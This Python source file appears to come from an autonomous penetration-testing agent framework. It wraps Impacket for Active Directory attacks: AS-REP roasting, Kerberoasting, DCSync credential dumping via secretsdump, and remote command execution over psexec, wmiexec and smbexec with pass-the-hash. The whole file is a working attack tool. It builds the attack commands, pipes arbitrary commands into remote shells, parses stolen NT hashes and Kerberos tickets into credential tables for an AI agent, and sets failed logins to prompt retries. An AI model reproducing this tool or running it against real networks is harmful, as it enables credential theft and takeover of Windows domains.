"""Impacket wrapper — AD attack toolkit (GetNPUsers, GetUserSPNs, secretsdump,
psexec/wmiexec/smbexec).

Each sub-action shells out to the corresponding `impacket-*` binary installed
by the `impacket` pip package. Output formats vary by tool — we parse each one
into a structured `findings` dict that the agent can feed straight into the
credentials / vulnerabilities entity tables.
"""
from __future__ import annotations

import re
from typing import Any

from tools.base import OffensiveTool, ToolResult, ToolStatus
from tools.registry import register


_ACTIONS = {"asreproast", "kerberoast", "secretsdump", "psexec", "wmiexec", "smbexec"}

_BINARIES = {
    "asreproast":  "impacket-GetNPUsers",
    "kerberoast":  "impacket-GetUserSPNs",
    "secretsdump": "impacket-secretsdump",
    "psexec":      "impacket-psexec",
    "wmiexec":     "impacket-wmiexec",
    "smbexec":     "impacket-smbexec",
}

# Format produced by GetNPUsers / GetUserSPNs — Hashcat-friendly Kerberos hashes.
_KRB_HASH = re.compile(r"^\$krb5(?:asrep|tgs)\$\S+", re.MULTILINE)
# secretsdump dumps NTDS in `user:rid:lmhash:nthash:::` form.
_NTDS_LINE = re.compile(
    r"^(?:(?P<domain>[^\\:\s]+)\\)?(?P<user>[^:\s]+):"
    r"(?P<rid>\d+):(?P<lm>[a-f0-9]{32}):(?P<nt>[a-f0-9]{32}):::",
    re.MULTILINE | re.IGNORECASE,
)
# Cleartext / Kerberos secrets section (LSA, cached).
_CLEARTEXT_LINE = re.compile(
    r"^\[\*\]\s+(?:Cleartext|Kerberos new keys|MSCACHE|DPAPI)[^\n]*", re.MULTILINE,
)


@register
class ImpacketTool(OffensiveTool):
    name = "impacket"
    phase = "lateral_movement"
    mitre_techniques = ["T1558.003", "T1558.004", "T1003.006", "T1021.002"]
    description = """
    Active Directory attack toolkit. Sub-actions:
      - asreproast (GetNPUsers.py)   — TTP T1558.004 (no-preauth users → AS-REP hash)
      - kerberoast (GetUserSPNs.py)  — TTP T1558.003 (service tickets → TGS hash)
      - secretsdump (DCSync)         — TTP T1003.006 (NTDS.dit / SAM / LSA)
      - psexec / wmiexec / smbexec   — TTP T1021.002 / T1047 (lateral exec)

    For the `*exec` actions, supply `command` to run a single non-interactive
    payload (the wrapper feeds it via stdin and exits). Use `ntlm_hash` for
    pass-the-hash; pair with `password` otherwise.
    """

    def param_schema(self) -> dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "action": {"type": "string", "enum": list(_ACTIONS)},
                "target_dc": {"type": "string",
                              "description": "DC IP for asreproast/kerberoast/secretsdump; "
                                             "target host for psexec/wmiexec/smbexec"},
                "domain": {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "ntlm_hash": {"type": "string", "description": "LMhash:NThash or :NThash"},
                "userlist": {"type": "string", "description": "Path to user list (asreproast)"},
                "command": {"type": "string", "description": "One-shot command for *exec"},
            },
            "required": ["action"],
        }

    # ─── execute ────────────────────────────────────────────────────────────

    def execute(self, **params: Any) -> ToolResult:
        action = params.get("action")
        if action not in _ACTIONS:
            return ToolResult(ToolStatus.ERROR, "", "",
                              error=f"Unknown action: {action!r}")

        if params.get("password") and params.get("ntlm_hash"):
            return ToolResult(ToolStatus.ERROR, "", "",
                              error="provide either password or ntlm_hash, not both")

        try:
            argv, stdin_script = _build_argv(action, params)
        except _BadArgs as exc:
            return ToolResult(ToolStatus.ERROR, "", "", error=str(exc))

        rc, stdout, stderr, duration = self._run(argv, input_data=stdin_script)
        cmd = self.quote(argv)

        if rc == -1:
            return ToolResult(ToolStatus.TIMEOUT, cmd, stdout,
                              error=stderr.strip() or "timeout", duration_sec=duration)

        findings = _parse(action, stdout, stderr)
        findings["action"] = action
        findings["domain"] = params.get("domain")

        # Auth / connection failures — surface as PARTIAL so the agent retries.
        if _auth_failed(stdout, stderr):
            return ToolResult(
                ToolStatus.PARTIAL, cmd, stdout + stderr,
                error="authentication or connection failed",
                findings=findings, duration_sec=duration,
            )
        if rc != 0 and not findings.get("tickets") and not findings.get("credentials"):
            return ToolResult(
                ToolStatus.ERROR, cmd, stdout + stderr,
                error=f"{_BINARIES[action]} exited {rc}: {stderr.strip()[:300]}",
                duration_sec=duration,
            )

        has_signal = bool(
            findings.get("tickets")
            or findings.get("credentials")
            or findings.get("output")
        )
        status = ToolStatus.SUCCESS if has_signal else ToolStatus.NO_FINDINGS
        return ToolResult(
            status=status,
            command=cmd,
            raw_output=stdout,
            findings=findings,
            duration_sec=duration,
        )


# ────────────────────────────────────────────────────────────────────────────
# argv construction — per-action mapping to impacket-* binaries
# ────────────────────────────────────────────────────────────────────────────


class _BadArgs(ValueError):
    pass


def _build_argv(action: str, p: dict[str, Any]) -> tuple[list[str], str | None]:
    binary = _BINARIES[action]
    domain = p.get("domain")
    user = p.get("username")
    password = p.get("password")
    ntlm = p.get("ntlm_hash")
    target = p.get("target_dc")

    if action == "asreproast":
        if not target:
            raise _BadArgs("asreproast requires target_dc")
        if not domain:
            raise _BadArgs("asreproast requires domain")
        argv = [binary, f"{domain}/", "-dc-ip", target]
        userlist = p.get("userlist")
        if userlist:
            argv += ["-usersfile", userlist, "-no-pass"]
        elif user and (password or ntlm):
            argv = [binary, _conn_principal(domain, user, password), "-dc-ip", target, "-request"]
            if ntlm:
                argv += ["-hashes", ntlm]
        else:
            raise _BadArgs("asreproast requires either userlist or username + password/ntlm_hash")
        return argv, None

    if action == "kerberoast":
        if not target or not domain or not user:
            raise _BadArgs("kerberoast requires domain, username, and target_dc")
        argv = [binary, _conn_principal(domain, user, password),
                "-dc-ip", target, "-request"]
        if ntlm:
            argv += ["-hashes", ntlm]
        if not password and not ntlm:
            raise _BadArgs("kerberoast requires password or ntlm_hash")
        return argv, None

    if action == "secretsdump":
        if not target or not user:
            raise _BadArgs("secretsdump requires username and target_dc")
        principal = _conn_principal(domain, user, password)
        argv = [binary, f"{principal}@{target}"]
        if ntlm:
            argv += ["-hashes", ntlm]
        if not password and not ntlm:
            raise _BadArgs("secretsdump requires password or ntlm_hash")
        return argv, None

    # psexec / wmiexec / smbexec — lateral execution.
    if action in {"psexec", "wmiexec", "smbexec"}:
        if not target or not user:
            raise _BadArgs(f"{action} requires username and target_dc")
        principal = _conn_principal(domain, user, password)
        argv = [binary, f"{principal}@{target}"]
        if ntlm:
            argv += ["-hashes", ntlm]
        if not password and not ntlm:
            raise _BadArgs(f"{action} requires password or ntlm_hash")
        command = p.get("command")
        # Drive the interactive shell via stdin. exit ends the subprocess.
        script = f"{command}\nexit\n" if command else "exit\n"
        return argv, script

    raise _BadArgs(f"unhandled action: {action}")


def _conn_principal(domain: str | None, user: str, password: str | None) -> str:
    """Build the `DOMAIN/user[:password]` half of an impacket connection string."""
    user_part = f"{domain}/{user}" if domain else user
    if password:
        return f"{user_part}:{password}"
    return user_part


# ────────────────────────────────────────────────────────────────────────────
# Parsing
# ────────────────────────────────────────────────────────────────────────────


def _parse(action: str, stdout: str, stderr: str) -> dict[str, Any]:
    if action in {"asreproast", "kerberoast"}:
        tickets = [m.group(0).strip() for m in _KRB_HASH.finditer(stdout)]
        return {"tickets": tickets, "count": len(tickets),
                "hash_type": "krb5asrep" if action == "asreproast" else "krb5tgs"}

    if action == "secretsdump":
        creds: list[dict[str, Any]] = []
        for m in _NTDS_LINE.finditer(stdout):
            nt = m.group("nt").lower()
            creds.append({
                "domain": m.group("domain"),
                "username": m.group("user"),
                "rid": int(m.group("rid")),
                "lm_hash": m.group("lm").lower(),
                "nt_hash": nt,
                # NTLM hash for an empty password — flag for visibility.
                "blank_password": nt == "31d6cfe0d16ae931b73c59d7e0c089c0",
            })
        cleartext_markers = [m.group(0) for m in _CLEARTEXT_LINE.finditer(stdout)]
        return {
            "credentials": creds,
            "count": len(creds),
            "cleartext_sections": cleartext_markers,
        }

    if action in {"psexec", "wmiexec", "smbexec"}:
        # No structured parsing — pass the raw output through. Strip impacket's
        # banner header so the agent only sees command output.
        body = "\n".join(
            line for line in stdout.splitlines()
            if not line.startswith("Impacket v")
            and not line.startswith("[*]") or "ERROR" in line
        )
        return {"output": body.strip()}

    return {}


_AUTH_PATTERNS = (
    "STATUS_LOGON_FAILURE",
    "STATUS_ACCESS_DENIED",
    "Kerberos SessionError",
    "preauth not required",   # ironic positive — only an indicator, not a failure
    "Connection refused",
    "Could not connect",
    "Errno 113",
    "STATUS_NO_LOGON_SERVERS",
)


def _auth_failed(stdout: str, stderr: str) -> bool:
    blob = stdout + "\n" + stderr
    return any(p in blob for p in _AUTH_PATTERNS if p != "preauth not required")
